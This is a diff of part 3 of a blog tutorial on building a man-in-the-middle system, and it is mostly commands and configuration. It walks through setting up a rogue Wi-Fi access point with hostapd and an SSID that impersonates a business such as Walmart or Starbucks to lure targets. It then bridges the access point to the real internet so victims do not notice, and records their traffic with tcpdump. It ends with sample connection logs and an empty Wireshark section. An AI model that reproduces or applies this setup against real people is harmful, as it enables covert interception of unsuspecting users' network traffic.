@@ -11,17 +11,133 @@ In this part 3 of the "**Build a Man-in-the-Middle System**" tutorial, I will de
 
 
 # 1. Access Point
-Before we get started, make sure you have two WiFi interfaces or one WiFi and one Ethernet interface. One will be used for creating access point and the other one will be used for internet. Because you will need to provide the internet access to your users. If not, they will figure something is wrong and will disconenct from your access point. **I will be using Ethernet**. But the instructions are same either way.
+Before we get started, make sure you have two WiFi interfaces or one WiFi and one Ethernet interface. One will be used for creating access point and the other one will be used for internet. Because you will need to provide the internet access to your users. If not, they will realize something is wrong and will disconenct from your access point. **I will use Ethernet**. But the instructions are same either way.
 
-hostapd will give us access point feature. THis will turn our WiFi adapter into access point mode.  
+To turn our wifi adapter into access point mode we will use a tool called `hostapd`. It is a user space daemon for access point and authentication servers. To install type the following command on a terminal:
 
-Create AP configuration file:
-1. WiFi interface
-2. Bridge Interface
-3. WiFi driver
-4. Hardware mode: a, b, g, n
-5. SSID/NAME entice your target to connect to you
-6. Channel
+~~~
+sudo apt-get update
+sudo apt-get install hostapd
+~~~
+
+If you haven't run the update before, run that command before installing `hostapd`. Now, this tool requires a config file that contains the necessary information to create access point. Let's create a blank document in that 'mitm' folder and rename it to `wifi_ap.config`. The file will need to have the following configs:  
+- **WiFi Interface:** The wifi interface you want to use to create access point. In my case it should be my Atheros WiFi adapter i.e. `wlxc01c3006xxxxx` or in Kali Linux it is `wlan0`.
+- **Bridge Interface:** We will need to create a bridge that will connect the access point and the internet. We can use any name for the bridge. We will call it `br0`.
+- **WiFi DriverL:** The wifi driver we want to use. That will be `nl80211`.
+- **Hardware mode:** If you look at the [IEEE 802.11](https://en.wikipedia.org/wiki/IEEE_802.11#Protocol) standard you will see wifi comes with different flavors. Hardware mode defines which of the flavor you want to use for your acess point. The hardware mode can be:
+	- a = IEEE 802.11a (5 GHz) (if your adapter supports 5GHz)
+	- b = IEEE 802.11b (2.4 GHz) (default)
+	- g = IEEE 802.11g (2.4 GHz) 
+	- ad = IEEE 802.11ad (60 GHz)
+	We will use `g`.
+- **SSID:** We will have to use a name for our access point that will entice our target to connect to it. Some of the examples can be, `StarbucksGuest`, `AT&T_Free`, `Walmartwifi_2.4`.
+- **Channel:** What channel you want to use for your access point.
+
+If you want to learn more about hostapd config file parameters checkout this [link](https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf).
+
+This is what my config file looks like:
+
+~~~
+interface=wlxc01c3006xxxxx
+bridge=br0
+driver=nl80211
+hw_mode=g
+ssid=Walmartwifi_2.4
+channel=1
+~~~
 
 # 2. Bridging
-Will create a virtual bridge betyween our two interfaces. get our target out to real internet so that they dont know that we are actually in the middle.
+As I mentioned earlier, we will need to create a virtual bridge between our two interfaces, wifi access point and the internet. That will take our target out to real internet and they wont know that we are actually in the middle. To do that we will use `bridge-utils`. To install type the following command in a terminal:
+
+~~~
+sudo apt-get install bridge-utils
+~~~
+
+Create a bridge using the following command:
+
+~~~
+sudo brctl addbr br0
+~~~
+
+`br0` is our bridge name. Now connect an interface to that bridge. In my case I am using an ethernet connection. And from `ifconfig` I know my ethernet interface is `ens33`. 
+
+~~~
+sudo brctl addif br0 ens33
+~~~
+
+Now bring up the bridge:
+
+~~~
+sudo ifconfig br0 up
+~~~
+
+If you want to see the details of the bridge that you just created type the following command:
+
+~~~
+brctl show
+~~~
+
+# 3. Put Everything Together
+
+- **Shutdown network manager:** So that it doesn't interfere with our work.
+
+~~~
+sudo /etc/init.d/network-manager stop
+~~~
+
+{: .box-warning}
+In Kali Linux: `sudo /etc/init.d/networking stop`
+
+- **Bring down interfaces:** If the wifi adapter is not down, turn it down.  
+~~~
+ifconfig -a
+sudo ifconfig wlxc01c3006xxxxx down
+sudo ifconfig ens33 down
+~~~
+
+- **Create bridge:** Add wifi adapter to bridge and bring up the bridge (section 2).  
+~~~
+sudo brctl addbr br0
+sudo brctl addif br0 ens33
+sudo ifconfig br0 up
+sudo ifconfig ens33 up
+~~~
+- **Launch AP:** Make sure the terminal is opened in the directory where the hostapd config file is. Then type the following: 
+~~~
+sudo hostapd -d wifi_ap.config
+~~~
+	`-d` enables verbose output. It is very helpful. It will show the vital information about your target when they connect to your access point. For example, the mac address, if their conenction is successful etc.
+
+- **Sniff on bridge:** We will start our sniffing on the bridge. Not on the wifi interface, not on the ehternet interface.
+~~~
+sudo tcpdump -i br0 -w rogue_ap_sniff.pacap
+~~~
+	If you don't know where the terminal is saving the pcap file, run `pwd` and it will show the current directory. Remember you are not going to see anything on the terminal, because the packets are being saved in that pcap file. To stop the sniffer simply press `Ctrl+C`. 
+	
+# 4. Await for Your Target
+Now it is time to wait for your target to conenct to your access point. When I connected to my rogue access point this is what showed up in the pcap file:
+
+{% highlight javascript linenos %}
+80211: BSS Event 59 (NL80211_CMD_FRAME) received for wlxc01c3006xxxxx
+wlxc01c3006xxxxx: Event RX_MGMT (18) received
+mgmt::auth
+authentication: STA=xx:xx:xx:xx:xx:xx auth_alg=0 auth_transaction=1 status_code=0 wep=0 seq_ctrl=0x10
+  New STA
+ap_sta_add: register ap_handle_timer timeout for xx:xx:xx:xx:xx:xx (300 seconds - ap_max_inactivity)
+nl80211: Add STA xx:xx:xx:xx:xx:xx
+  * supported rates - hexdump(len=4): 02 04 0b 16
+  * capability=0x0
+  * aid=1 (UNASSOC_STA workaround)
+  * listen_interval=0
+  * flags set=0x0 mask=0xa0
+wlxc01c3006xxxxx: STA xx:xx:xx:xx:xx:xx IEEE 802.11: authentication OK (open system)
+wlxc01c3006xxxxx: STA xx:xx:xx:xx:xx:xx MLME: MLME-AUTHENTICATE.indication(xx:xx:xx:xx:xx:xx, OPEN_SYSTEM)
+wlxc01c3006xxxxx: STA xx:xx:xx:xx:xx:xx MLME: MLME-DELETEKEYS.request(xx:xx:xx:xx:xx:xx)
+authentication reply: STA=xx:xx:xx:xx:xx:xx auth_alg=0 auth_transaction=2 resp=0 (IE len=0) (dbg=handle-auth)
+{% endhighlight %}
+
+Line 5 shows when the my device connected to the access point. Line 4 shows my devices mac address. Look for `AP-STA-DISCONNECTED` to find disconnect events.
+
+# 5. Reading pcap Files using Wireshark
+
+
